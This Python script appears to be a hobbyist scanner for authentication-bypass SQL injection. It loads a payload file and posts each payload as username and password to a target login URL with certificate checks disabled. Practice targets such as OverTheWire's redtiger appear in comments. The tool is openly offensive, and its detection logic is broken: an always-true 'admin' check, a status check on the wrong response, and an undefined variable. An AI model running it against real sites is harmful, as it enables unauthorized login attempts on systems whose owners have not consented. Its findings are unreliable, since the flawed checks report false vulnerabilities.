import os
import asyncio
import re
import requests
from colorama import Fore,init
from datetime import datetime
# import sock
# from database import create_database_for_Captures
import sqlite3
import logging


############################################################################
attack_type = "authentication bypass SQL injection"
#############################################################################

""" 
              Reference : https://github.com/payloadbox/sql-injection-payload-list 
              for The payloads"""

logging.basicConfig(filename="SQLJ.log",level=logging.DEBUG)



####################################33
pattern = r"\berror\b"
htmlpattern = r"\bid\b"
capturesAUTHBYPASS = []
########################################


#



async def auth_SQL_inj(urls):
    """This is the authentication bypass sql injection block. it occurs when the input datas are not validated and attacker can inject its own code to the database and bypass the authentication"""
    try:
        global pattern,htmlpattern 
        done = False 
        filename = "auth_bypass.txt" 
        current_directory = os.path.dirname(os.path.abspath(__file__)) 
        file_path = os.path.join(current_directory, filename) 

        with open(file_path, "r") as file: 
            payload = file.read() 
            rows = payload.split("\n") 
            sorted_rows = sorted(rows) 
            sorted_payload = "\n".join(sorted_rows)
            print(f"[{datetime.now()}]",Fore.RED + str(sorted_payload)) 
            requests.packages.urllib3.disable_warnings()  #! Disable SSL warnings for http requests and testing
            # url = "https://redtiger.labs.overthewire.org/level1.php"
            req = requests.get(url=urls,verify=False) 
            if req.status_code == 200: 
                ask = input(f"[{datetime.now()}]"+Fore.GREEN + f"Looks like the host is up with the url: {urls}\n Do you want to send the above payload to the website? ")
                logging.info(f"the host{urls} is up and returned status code with 200,Time:{datetime.now()}")

                if ask.lower() == "y": 
                    for line in sorted_payload.split("\n"):
                        #############################################################33
                        params = { 
                            "username": line,
                            "password": line
                        }
                        ##############################################################################
                        ack = requests.post(url=urls, data=params,verify=False) 
                        print(f"[{datetime.now()}]","|Current payload: |", line ,"|with status code|:",ack.status_code) #* prints the current status code with its payload
                        await asyncio.sleep(5) 
                        if "error" in ack.text: 
                            print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found|:", ack.text)
                            logging.info(f"Could find the error word in the text response in the target:{urls}.This may indicates that it has some vulnerability in the backend.Time captured:{datetime.now()}")
                            
                        vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE)
                        htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE) 
                        if vuln: 
                            print(f"[{datetime.now()}]",Fore.RED + " | Vulnerability found Status: |", ack.text," | with the count of: |",len(vuln),"|Attack:|"+"|authentication bypass SQL injection|")
                            logging.info(f"Could find vulnerability in the target:{urls}.This might not be accurate.Time:{datetime.now()}.testing parameters:(id,error)")
                            await asyncio.sleep(3) 
                        
                        if htmlVULN:
                            print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found:|", ack.text,"|with the count of|:",len(htmlVULN))
                            logging.info(f"Could find vulnerability in the html response in the target(id,error): {urls}.Time captures:{datetime.now()}")
                            await asyncio.sleep(3)
                        
                        word = "id" in req.text 
                        errword = "error" in req.text
                        if word:
                            print(f"[{datetime.now()}]",Fore.GREEN + "|Vulnerability found with the rows Status:|:", word if word is True else "|Nothing found with the error basic attack|","|Attack:|","authentication bypass SQL injection")
                            logging.info(f"Could find some testing parameters(id) in the target url:{urls},Time captured:{datetime.now()}")
                            await asyncio.sleep(3)
                        
                        if errword:
                            print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found in the Error based attack Status|:","|" ,errword if errword is True else "|Nothing found with the error basic attack|","|Attack:|","authentication bypass SQL injection")
                            logging.info(f"Could find some testing parameters that appears to be injectable in the target(error):target:{urls},Time captured:{datetime.now()}")
                            await asyncio.sleep(3)
                            
                        
                            
                    if req.status_code == 302: 
                        print(f"[{datetime.now()}]",Fore.GREEN+"[INFO]Could found injectable area on the website with the keyword:","|",line,"|"+"|Attack:|"+"authentication bypass SQL injection")
                        logging.info(f"[INFO]Could found injectable area on the website with the keyword:{line},Time captured:{datetime.now()},attack:{attack_type}")
                        done = True
                    
                    if "Admin" or "admin" in vuln or "Admin" or "admin" in ack.text or "Admin" or "admin" in htmlVULN:
                        print(f"[{datetime.now()}]",Fore.GREEN+"[INFO]Could connect to the website but did found injectable area on the website.","|Attack:|","authentication bypass SQL injection")
                        logging.info(f"Could connect but found (admin) parameters in the target.attack:{attack_type},Time:{datetime.now()}")
                        
            else:
                print(f"[{datetime.now()}]",Fore.RED+"Host is down","|Attack:|","authentication bypass SQL injection")
                logging.error(f"Host is down,attack:{attack_type},Time:{datetime.now()}")
                
        conn = sqlite3.connect("SQLJresult.db")
        cur = conn.cursor()

        sql = "INSERT INTO Datas (Data,attacktype) VALUES (?,?)"
        # values = [attack_type,(ack.text,), (str(headers),), (str(ack.status_code),), (str(vuln,),), (str(htmlVULN),), (str(errword),), (str(word),), (str(req.status_code),), (str(ack.text),)]
        values = [(attack_type, str(ack.text)), (attack_type, str(headers)), (attack_type, str(ack.status_code)), (attack_type, str(vuln)), (attack_type, str(htmlVULN)), (attack_type, str(errword)), (attack_type, str(word)), (attack_type, str(req.status_code)), (attack_type, str(ack.text))]

        cur.executemany(sql, values)

        conn.commit()
        conn.close()
        
                        
                    
    except Exception as e:
        print(f"{datetime.now()}",Fore.RED+"Error:",e,"|Attack:|",attack_type)
        logging.error(f"An error occurred:{e},Time: {datetime.now()}")
        
    except KeyboardInterrupt:
        # print(f"[{datetime.now()}]","Exiting...")
        pass
        
    except ConnectionAbortedError as e:
        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection aborted error:",e,"|Attack:|",attack_type)
        
    except ConnectionError as e:
        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection error:",e,"|Attack:|",attack_type)
        
    except ConnectionRefusedError as e:
        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection refused error:",e,"|Attack:|",attack_type)
        
    except ConnectionResetError as e:
        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection reset error:",e,"|Attack:|",attack_type)
        
    except UnicodeEncodeError:
        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] UnicodeEncodeError:",e,"|Attack:|",attack_type)
        
    except MemoryError:
        import psutil
        # Get the system memory information
        memory = psutil.virtual_memory()

        # Calculate the threshold for 80% memory usage
        threshold = memory.total * 0.9

        # Check if the used memory is greater than the threshold
        Err =  memory.used <= threshold
        while not Err:
            memory = psutil.virtual_memory()
            Err = memory.used <= threshold
            print(Fore.RED+"[INFO]Please Release you RAM space to continue the application"+"|Attack:|",attack_type)
            await asyncio.sleep(5)
# asyncio.run(Memory_handling())
        
    finally:
        pass
        # print(f"[{datetime.now()}]",Fore.BLUE+f"""[INFO] The final result of html response:
        #             \n{ack.text}\n     """)
        # capturesAUTHBYPASS.append(ack.text)
        
        
# asyncio.run(auth_SQL_inj(["http://testfire.net/login.jsp"]))
# asyncio.run(auth_SQL_inj("https://redtiger.labs.overthewire.org/"))
# url = "https://redtiger.labs.overthewire.org/"
# asyncio.run(auth_SQL_inj(url))
# if __name__ != "main":
#     pass      

async def auth_main(urL):
    await auth_SQL_inj(urL)

# asyncio.run(auth_main("https://redtiger.labs.overthewire.org/level1.php"))
